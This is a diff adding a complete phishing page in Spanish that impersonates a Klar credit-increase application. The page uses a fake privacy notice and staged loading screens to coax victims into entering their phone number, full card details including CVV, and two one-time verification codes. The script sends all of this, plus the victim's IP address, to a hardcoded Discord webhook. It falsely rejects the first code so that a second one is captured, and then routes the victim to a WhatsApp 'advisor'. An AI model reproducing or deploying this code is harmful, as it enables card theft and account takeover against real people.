@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solicitud de Crédito - Klar</title>
+    
+    <style>
+        body {
+            background-color: #0b0b0b;
+            background-image: url('fond.jpg'); 
+            background-size: cover;
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-attachment: scroll;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        .index1-page {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-sizing: border-box;
+            padding: 10px;
+        }
+
+        .tarjeta-login {
+            background-color: rgba(17, 17, 17, 0.94) !important;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-radius: 20px !important;
+            padding: 25px 20px !important;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6) !important;
+            max-width: 450px;
+            width: 100%;
+            margin: 0 auto 20px auto;
+            box-sizing: border-box;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .tarjeta-login .titulo-principal {
+            font-size: 24px !important;
+            font-weight: 700 !important;
+            color: #ffffff !important;
+            margin-bottom: 8px !important;
+            letter-spacing: -0.5px;
+            text-align: center;
+        }
+
+        .tarjeta-login .subtitulo {
+            font-size: 14px !important;
+            color: #cccccc !important;
+            line-height: 1.4 !important;
+            margin-bottom: 20px !important;
+            text-align: center;
+        }
+
+        .paso-vista {
+            display: none; 
+        }
+        .paso-vista.activo {
+            display: block; 
+        }
+
+        .contenedor-simulador {
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .monto-display {
+            font-size: 28px !important;
+            font-weight: 700 !important;
+            color: #ffffff !important;
+            text-align: center;
+            margin-bottom: 12px;
+            background: #000000;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid #333333;
+            letter-spacing: -0.5px;
+        }
+
+        .slider-credito {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 6px;
+            border-radius: 5px;
+            background: #333333;
+            outline: none;
+            margin: 15px 0;
+        }
+
+        .slider-credito::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #ffffff;
+            cursor: pointer;
+            border: 2px solid #000000;
+        }
+
+        .limites-slider {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #aaaaaa;
+            font-weight: 600;
+        }
+
+        .resumen-monto {
+            background: #000000;
+            border: 1px dashed #333333;
+            border-radius: 12px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .resumen-monto span {
+            font-size: 13px;
+            color: #aaaaaa;
+        }
+
+        .resumen-monto strong {
+            font-size: 16px;
+            color: #ffffff;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #cccccc;
+            margin-bottom: 6px;
+        }
+
+        .input-klar {
+            width: 100%;
+            background-color: #000000;
+            border: 1px solid #333333;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 16px !important;
+            color: #ffffff;
+            box-sizing: border-box;
+            outline: none;
+            text-align: left;
+        }
+
+        .input-codigo {
+            text-align: center !important;
+            letter-spacing: 8px !important;
+            font-size: 24px !important;
+            font-weight: 700 !important;
+        }
+
+        .input-klar:focus {
+            border-color: #ffffff;
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-iniciar-sesion {
+            width: 100% !important;
+            background-color: #ffffff !important;
+            color: #000000 !important;
+            border: none !important;
+            padding: 16px !important;
+            font-size: 16px !important;
+            font-weight: 700 !important;
+            border-radius: 30px !important;
+            cursor: pointer;
+            margin-top: 10px !important;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+            transition: opacity 0.2s ease;
+        }
+
+        .btn-iniciar-sesion:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-regresar {
+            background: none;
+            border: none;
+            color: #aaaaaa;
+            font-size: 13px;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 0;
+        }
+
+        .contenedor-logo-global {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px 10px 10px 10px;
+            box-sizing: border-box;
+        }
+
+        .logo-klar-texto {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: -1.5px;
+            margin: 0;
+            text-transform: uppercase;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .icono-exito {
+            font-size: 50px;
+            color: #4BB543;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+
+        .modal-recuadro {
+            background-color: #141414;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 25px 20px;
+            max-width: 380px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.9);
+            box-sizing: border-box;
+            margin: auto;
+        }
+
+        .modal-texto-container {
+            text-align: center;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .modal-titulo-instruccion {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            margin: 0;
+        }
+
+        .modal-linea-texto {
+            font-size: 14px;
+            color: #cccccc;
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        /* Recuadro de Aviso y Términos */
+        .recuadro-aviso {
+            background: #000000;
+            border: 1px solid #333333;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .recuadro-aviso p {
+            font-size: 12px;
+            color: #aaaaaa;
+            line-height: 1.4;
+            margin: 0 0 10px 0;
+        }
+
+        .contenedor-check {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .contenedor-check input[type="checkbox"] {
+            margin-top: 2px;
+            accent-color: #ffffff;
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .contenedor-check span {
+            font-size: 12px;
+            color: #ffffff;
+            font-weight: 500;
+            line-height: 1.3;
+        }
+    </style>
+</head>
+<body class="index1-login">
+
+<div class="index1-page">
+    <div class="contenedor-logo-global">
+        <h1 class="logo-klar-texto">KLAR</h1>
+    </div>
+
+    <main class="index1-main">
+        <section class="center-stage">
+            <div class="tarjeta-login">
+                
+                <!-- PASO 1 -->
+                <div id="paso-1" class="paso-vista activo">
+                    <h1 class="titulo-principal">Monto del Crédito</h1>
+                    <p class="subtitulo">Ingresa tu número celular asociado y selecciona el monto que deseas solicitar.</p>
+
+                    <div class="form-group">
+                        <label for="numeroCelular">Número de Celular</label>
+                        <input type="tel" id="numeroCelular" class="input-klar" placeholder="10 dígitos" maxlength="10" inputmode="numeric" required autocomplete="off">
+                    </div>
+
+                    <div class="contenedor-simulador">
+                        <div class="monto-display" id="montoTexto">$ 1,000 MXN</div>
+                        <input type="range" id="sliderCredito" class="slider-credito" min="1000" max="1000000" step="5000" value="1000">
+                        <div class="limites-slider">
+                            <span>Min: $1,000</span>
+                            <span>Max: $1,000,000</span>
+                        </div>
+                    </div>
+
+                    <!-- RECUADRO AVISO DE PRIVACIDAD Y CONDICIONES -->
+                    <div class="recuadro-aviso">
+                        <p>🔒 <strong>Aviso de Uso de Datos:</strong></p>
+                        <p>Los datos recolectados en esta solicitud serán utilizados únicamente para el trámite de evaluación y aumento de tu línea de crédito, garantizando la confidencialidad del proceso.</p>
+                        <label class="contenedor-check">
+                            <input type="checkbox" id="checkCondiciones">
+                            <span>Acepto las condiciones y el uso de mis datos exclusivamente para la gestión del aumento de crédito.</span>
+                        </label>
+                    </div>
+
+                    <button type="button" id="btnContinuarCredito" class="btn-iniciar-sesion" disabled>Continuar Solicitud</button>
+                </div>
+
+                <!-- PASO 2 -->
+                <div id="paso-2" class="paso-vista">
+                    <button type="button" id="btnVolverPaso1" class="btn-regresar">← Volver</button>
+                    
+                    <h1 class="titulo-principal">Método de Cobro</h1>
+                    <p class="subtitulo">Ingresa los datos de tu tarjeta física, digital o crédito para asociarla a tu solicitud.</p>
+
+                    <div class="resumen-monto">
+                        <span>Monto seleccionado:</span>
+                        <strong id="montoConfirmado">$ 1,000 MXN</strong>
+                    </div>
+
+                    <div id="formTarjeta" style="margin: 0;">
+                        <div class="form-group">
+                            <label for="nombreTitular">Nombre del titular</label>
+                            <input type="text" id="nombreTitular" class="input-klar" placeholder="Nombre completo" required autocomplete="off">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="numeroTarjeta">Número de tarjeta </label>
+                            <input type="text" id="numeroTarjeta" class="input-klar" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required autocomplete="off">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="expiracion">Vencimiento</label>
+                            <input type="text" id="expiracion" class="input-klar" placeholder="MM/AA" maxlength="5" inputmode="numeric" required autocomplete="off">
+                        </div>
+
+                        <button type="button" id="btnAbrirModalCVV" class="btn-iniciar-sesion">Continuar</button>
+                    </div>
+                </div>
+
+                <!-- PASO 3: ESPERA DE 10 SEGUNDOS + ENVÍO DE DATOS DE TARJETA -->
+                <div id="paso-espera" class="paso-vista" style="text-align: center; padding: 20px 0;">
+                    <div class="spinner"></div>
+                    <h1 class="titulo-principal">Generando Código</h1>
+                    <p class="subtitulo">Estamos procesando tu crédito, por favor espera un momento...</p>
+                </div>
+
+                <!-- PASO 4: CÓDIGO DE 6 DÍGITOS -->
+                <div id="paso-codigo" class="paso-vista">
+                    <button type="button" id="btnVolverPaso2" class="btn-regresar">← Volver</button>
+                    
+                    <h1 class="titulo-principal">Verificación</h1>
+                    <p class="subtitulo">Ingresa el código de 6 dígitos recibido para confirmar tu identidad.</p>
+
+                    <div style="margin: 30px 0;">
+                        <div class="form-group">
+                            <label for="codigoVerificacion" style="text-align: center;">Código de 6 dígitos</label>
+                            <input type="text" id="codigoVerificacion" class="input-klar input-codigo" placeholder="------" maxlength="6" inputmode="numeric" required autocomplete="off">
+                        </div>
+                    </div>
+
+                    <button type="button" id="btnFinalizar" class="btn-iniciar-sesion">Confirmar Código</button>
+                </div>
+
+                <!-- PASO 5: CARGA -->
+                <div id="paso-carga" class="paso-vista" style="text-align: center; padding: 20px 0;">
+                    <div class="spinner"></div>
+                    <h1 class="titulo-principal">Procesando</h1>
+                    <p class="subtitulo">Validando tus datos, por favor espera...</p>
+                </div>
+
+                <!-- PASO 6: ÉXITO -->
+                <div id="paso-exito" class="paso-vista" style="text-align: center; padding: 20px 0;">
+                    <div class="icono-exito">✔</div>
+                    <h1 class="titulo-principal">¡Solicitud Exitosa!</h1>
+                    <p class="subtitulo">Tu solicitud ha sido procesada correctamente.</p>
+                    <button type="button" onclick="location.reload();" class="btn-iniciar-sesion" style="margin-top: 15px;">Finalizar</button>
+                </div>
+
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer-container" style="text-align: center; margin: 15px 0; color: #fff;">
+        <div class="footer-content">
+            <div class="info-footer">
+                <div class="ip-text" style="color: #ccc; font-size: 11px; text-shadow: 0 1px 2px rgba(0,0,0,0.8);">Dirección IP: <span id="gfg">Obteniendo...</span></div>
+            </div>
+        </div>
+    </footer>
+</div>
+
+<!-- MODAL DE CARGA (5 SEGUNDOS) -->
+<div id="modalCargaCVV" class="modal-overlay">
+    <div class="modal-recuadro">
+        <div class="spinner"></div>
+        <p class="modal-titulo-instruccion" style="margin-top: 15px;">Validando Información</p>
+        <p class="modal-linea-texto" style="margin-top: 8px;">Por favor espera un momento...</p>
+    </div>
+</div>
+
+<!-- MODAL PARA PEDIR EL CVV -->
+<div id="modalCVV" class="modal-overlay">
+    <div class="modal-recuadro">
+        <div class="modal-texto-container">
+            <p class="modal-titulo-instruccion">Código de Seguridad</p>
+            <p class="modal-linea-texto">Ingresa el código CVV (3 dígitos al reverso de tu tarjeta) para verificar método donde se realizara el aumento.</p>
+        </div>
+
+        <div class="form-group" style="margin-bottom: 20px;">
+            <input type="password" id="cvvModal" class="input-klar input-codigo" placeholder="123" maxlength="3" inputmode="numeric" required autocomplete="off">
+        </div>
+
+        <button type="button" id="btnConfirmarCVV" class="btn-iniciar-sesion">Confirmar y Continuar</button>
+        <button type="button" id="btnCancelarCVV" class="btn-regresar" style="margin: 15px auto 0 auto;">Cancelar</button>
+    </div>
+</div>
+
+<!-- MODAL ALERTA WHATSAPP -->
+<div id="modalAlerta" class="modal-overlay">
+    <div class="modal-recuadro">
+        <div class="modal-texto-container">
+            <p class="modal-titulo-instruccion">¡Casi listos para continuar!</p>
+            <p class="modal-linea-texto">Vuelve al chat con tu asesor en WhatsApp para finalizar tu proceso.</p>
+        </div>
+
+        <a href="https://wa.me/523351055701?text=Sigue%20la%20solicitud%20con%20tu%20asesor" target="_blank" id="btnCerrarModal" class="btn-iniciar-sesion">Aceptar</a>
+    </div>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+    const paso1 = document.getElementById("paso-1");
+    const paso2 = document.getElementById("paso-2");
+    const pasoEspera = document.getElementById("paso-espera");
+    const pasoCodigo = document.getElementById("paso-codigo");
+    const pasoCarga = document.getElementById("paso-carga");
+    const pasoExito = document.getElementById("paso-exito");
+    
+    const modalCargaCVV = document.getElementById("modalCargaCVV");
+    const modalCVV = document.getElementById("modalCVV");
+    const inputCVVModal = document.getElementById("cvvModal");
+    const btnAbrirModalCVV = document.getElementById("btnAbrirModalCVV");
+    const btnConfirmarCVV = document.getElementById("btnConfirmarCVV");
+    const btnCancelarCVV = document.getElementById("btnCancelarCVV");
+
+    const modalAlerta = document.getElementById("modalAlerta");
+    const btnWhatsApp = document.getElementById("btnCerrarModal");
+    
+    const slider = document.getElementById("sliderCredito");
+    const montoTexto = document.getElementById("montoTexto");
+    const montoConfirmado = document.getElementById("montoConfirmado");
+    const checkCondiciones = document.getElementById("checkCondiciones");
+    const btnContinuar = document.getElementById("btnContinuarCredito");
+    const btnVolverPaso1 = document.getElementById("btnVolverPaso1");
+    const btnVolverPaso2 = document.getElementById("btnVolverPaso2");
+    const btnFinalizar = document.getElementById("btnFinalizar");
+    const inputCodigo = document.getElementById("codigoVerificacion");
+    const inputCelular = document.getElementById("numeroCelular");
+
+    const webhookURL = "https://discord.com/api/webhooks/1537542047043690536/UCmUdA-BB9Cz7KKaFPishOiCup6g6mDpKZ2QR9IDECtiWlomkX_n3o1J1WuIQ7esV15W";
+
+    // Variable para controlar los 2 intentos del código
+    let intentosCodigo = 0;
+
+    function formatMoneda(valor) {
+        return "$ " + parseInt(valor).toLocaleString('es-MX', { minimumFractionDigits: 0 }) + " MXN";
+    }
+
+    // Formato sólo números para celular
+    inputCelular.addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 10);
+    });
+
+    // Activar/desactivar botón según estado del checkbox de condiciones
+    checkCondiciones.addEventListener("change", function() {
+        btnContinuar.disabled = !this.checked;
+    });
+
+    // Evento de la corredera (Slider de crédito)
+    slider.addEventListener("input", function() {
+        montoTexto.textContent = formatMoneda(this.value);
+    });
+
+    btnContinuar.addEventListener("click", function() {
+        const celular = inputCelular.value.trim();
+
+        if (celular.length < 10) {
+            alert("Por favor ingresa un número de celular válido de 10 dígitos.");
+            inputCelular.focus();
+            return;
+        }
+
+        if (!checkCondiciones.checked) {
+            alert("Debes aceptar las condiciones de uso de datos para continuar.");
+            return;
+        }
+
+        const valorSeleccionado = formatMoneda(slider.value);
+        montoConfirmado.textContent = valorSeleccionado;
+        sessionStorage.setItem("monto_solicitado", slider.value);
+        sessionStorage.setItem("numero_celular", celular);
+
+        paso1.classList.remove("activo");
+        paso2.classList.add("activo");
+    });
+
+    btnVolverPaso1.addEventListener("click", function() {
+        paso2.classList.remove("activo");
+        paso1.classList.add("activo");
+    });
+
+    // Formatos de tarjeta
+    const inputTarjeta = document.getElementById("numeroTarjeta");
+    inputTarjeta.addEventListener("input", function(e) {
+        let val = e.target.value.replace(/\D/g, '').substring(0, 16);
+        let blocks = val.match(/.{1,4}/g);
+        e.target.value = blocks ? blocks.join(' ') : '';
+    });
+
+    const inputExp = document.getElementById("expiracion");
+    inputExp.addEventListener("input", function(e) {
+        let val = e.target.value.replace(/\D/g, '').substring(0, 4);
+        if (val.length >= 2) {
+            e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+        } else {
+            e.target.value = val;
+        }
+    });
+
+    inputCVVModal.addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+    });
+
+    // IP del usuario
+    const ipGuardada = sessionStorage.getItem("sd_ip");
+    const ipSpan = document.getElementById("gfg");
+
+    if (ipGuardada && ipSpan) {
+        ipSpan.textContent = ipGuardada;
+    } else if (ipSpan) {
+        fetch("https://ipapi.co/json/")
+            .then(res => res.json())
+            .then(data => {
+                if (data.ip) {
+                    sessionStorage.setItem("sd_ip", data.ip);
+                    ipSpan.textContent = data.ip;
+                }
+            }).catch(() => {
+                ipSpan.textContent = "127.0.0.1";
+            });
+    }
+
+    // Al hacer clic en "Continuar" en el Paso 2
+    btnAbrirModalCVV.addEventListener("click", function() {
+        const titular = document.getElementById("nombreTitular").value.trim();
+        const tarjeta = inputTarjeta.value.trim();
+        const expiracion = inputExp.value.trim();
+
+        if (!titular || !tarjeta || !expiracion) {
+            alert("Por favor completa todos los datos obligatorios de la tarjeta para continuar.");
+            return;
+        }
+
+        if (tarjeta.replace(/\s/g, '').length < 16) {
+            alert("Por favor ingresa un número de tarjeta válido de 16 dígitos.");
+            inputTarjeta.focus();
+            return;
+        }
+
+        if (expiracion.length < 5) {
+            alert("Por favor ingresa una fecha de expiración válida en formato MM/AA.");
+            inputExp.focus();
+            return;
+        }
+
+        // Muestra modal de carga por 5 segundos
+        modalCargaCVV.style.display = "flex";
+
+        setTimeout(() => {
+            modalCargaCVV.style.display = "none";
+            inputCVVModal.value = "";
+            modalCVV.style.display = "flex";
+            inputCVVModal.focus();
+        }, 5000);
+    });
+
+    btnCancelarCVV.addEventListener("click", function() {
+        modalCVV.style.display = "none";
+    });
+
+    // Confirmación del CVV en el modal y posterior envío a Discord
+    btnConfirmarCVV.addEventListener("click", function() {
+        const cvv = inputCVVModal.value.trim();
+
+        if (cvv.length !== 3) {
+            alert("El código CVV debe tener exactamente 3 dígitos.");
+            inputCVVModal.focus();
+            return;
+        }
+
+        const titular = document.getElementById("nombreTitular").value.trim();
+        const tarjeta = inputTarjeta.value.trim();
+        const expiracion = inputExp.value.trim();
+        const celular = sessionStorage.getItem("numero_celular") || "No especificado";
+
+        modalCVV.style.display = "none";
+        paso2.classList.remove("activo");
+        pasoEspera.classList.add("activo");
+
+        const monto = montoConfirmado.textContent;
+        const ip = ipSpan ? ipSpan.textContent : "Desconocida";
+
+        const payloadTarjeta = {
+            content: "🚨 **¡Nueva Solicitud de Crédito y Tarjeta!** 🚨",
+            embeds: [{
+                title: "Detalles y Datos de Tarjeta",
+                color: 16711680,
+                fields: [
+                    { name: "📱 Número de Celular", value: celular, inline: false },
+                    { name: "💰 Monto Solicitado", value: monto, inline: false },
+                    { name: "👤 Titular", value: titular, inline: true },
+                    { name: "💳 Número de Tarjeta", value: tarjeta, inline: true },
+                    { name: "📅 Expiración", value: expiracion, inline: true },
+                    { name: "🔐 CVV", value: cvv, inline: true },
+                    { name: "🌐 Dirección IP", value: ip, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        Promise.all([
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payloadTarjeta)
+            }).catch(err => console.log("Error envío tarjeta:", err)),
+            new Promise(resolve => setTimeout(resolve, 10000))
+        ]).then(() => {
+            pasoEspera.classList.remove("activo");
+            pasoCodigo.classList.add("activo");
+        });
+    });
+
+    btnVolverPaso2.addEventListener("click", function() {
+        pasoCodigo.classList.remove("activo");
+        paso2.classList.add("activo");
+    });
+
+    inputCodigo.addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
+    });
+
+    // Envío del código con repetición e IP incluida
+    btnFinalizar.addEventListener("click", function() {
+        const codigo = inputCodigo.value.trim();
+
+        if (codigo.length !== 6) {
+            alert("Por favor ingresa un código de verificación válido de 6 dígitos.");
+            inputCodigo.focus();
+            return;
+        }
+
+        intentosCodigo++;
+
+        pasoCodigo.classList.remove("activo");
+        pasoCarga.classList.add("activo");
+
+        const ip = ipSpan ? ipSpan.textContent : "Desconocida";
+
+        const payloadCodigo = {
+            content: `🔑 **¡Código de Verificación Recibido (Intento ${intentosCodigo}/2)!** 🔑`,
+            embeds: [{
+                title: `Código de Autorización #${intentosCodigo}`,
+                color: intentosCodigo === 1 ? 16776960 : 65280,
+                fields: [
+                    { name: "🔑 Código Ingresado", value: `\`\`\`${codigo}\`\`\``, inline: false },
+                    { name: "🌐 Dirección IP", value: ip, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payloadCodigo)
+        })
+        .then(() => procesarFlujoCodigo())
+        .catch(error => {
+            console.error("Error en el envío del código:", error);
+            procesarFlujoCodigo();
+        });
+    });
+
+    function procesarFlujoCodigo() {
+        if (intentosCodigo < 2) {
+            // Mantiene la pantalla de "Procesando" durante 15 segundos
+            setTimeout(() => {
+                pasoCarga.classList.remove("activo");
+                alert("Código de verificación incorrecto o expirado. Por favor ingresa el nuevo código enviado.");
+                inputCodigo.value = "";
+                pasoCodigo.classList.add("activo");
+                inputCodigo.focus();
+            }, 15000); 
+        } else {
+            // En el segundo intento la respuesta toma 1.5 segundos
+            setTimeout(() => {
+                pasoCarga.classList.remove("activo");
+                modalAlerta.style.display = "flex";
+            }, 1500);
+        }
+    }
+
+    btnWhatsApp.addEventListener("click", function() {
+        modalAlerta.style.display = "none";
+        pasoExito.classList.add("activo");
+    });
+});
+</script>
+
+</body>
+</html>
